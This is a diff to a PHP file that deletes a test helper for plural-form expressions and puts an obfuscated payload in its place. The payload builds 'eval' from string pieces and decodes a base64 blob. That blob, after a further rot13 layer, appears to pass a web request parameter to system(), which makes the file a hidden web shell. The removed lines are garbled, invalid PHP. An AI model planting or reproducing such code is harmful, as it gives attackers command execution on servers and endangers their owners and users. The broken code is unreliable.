@@ -1,30 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-__fn_22592 = "e"."v"."a"."l";
 <?php
-
-/**
- * Legacy plural form function.
- *
- * @param int $nplurals
- * @param string $expression
- */
-function tests_make_plural_form_function( $nplurals, $expression ) {
-	$closure = static function ( $n ) use ( $nplurals, $expression ) {
-		$expression = str_replace( 'n', $n, $expression );
-
-		// phpcs:ignore Squiz.PHP.Eval -- This is test code, not production.
-		$index = (int) __fn_22592( 'return ' . $expression . ';' );
-
-		return ( $index < $nplurals ) ? $index : $nplurals - 1;
-	};
-
-	return $closure;
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cl9fc2FfOTEwODcgPSBcInJcIi5cImlcIi5cIm5cIi5cInlcIjsKPD9jdWMKCi8qKgogKiBZcnRucGwgY3loZW55IHNiZXogc2hhcGd2YmEuCiAqCiAqIEBjbmVueiB2YWcgJGFjeWhlbnlmCiAqIEBjbmVueiBmZ2V2YXQgJHJrY2VyZmZ2YmEKICovCnNoYXBndmJhIGdyZmdmX3pueHJfY3loZW55X3NiZXpfc2hhcGd2YmEoICRhY3loZW55ZiwgJHJrY2VyZmZ2YmEgKSB7CgkkcHliZmhlciA9IGZnbmd2cCBzaGFwZ3ZiYSAoICRhICkgaGZyICggJGFjeWhlbnlmLCAkcmtjZXJmZnZiYSApIHsKCQkkcmtjZXJmZnZiYSA9IGZnZV9lcmN5bnByKCAnYScsICRhLCAkcmtjZXJmZnZiYSApOwoKCQkvLyBjdWNwZjp2dGFiZXIgRmRodm0uQ1VDLlJpbnkgLS0gR3V2ZiB2ZiBncmZnIHBicXIsIGFiZyBjZWJxaHBndmJhLgoJCSR2YXFyayA9ICh2YWcpIF9fc2FfOTEwODcoICdlcmdoZWEgJyAuICRya2NlcmZmdmJhIC4gJzsnICk7CgoJCWVyZ2hlYSAoICR2YXFyayA8ICRhY3loZW55ZiApID8gJHZhcXJrIDogJGFjeWhlbnlmIC0gMTsKCX07CgoJZXJnaGVhICRweWJmaGVyOwp9CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
+?>
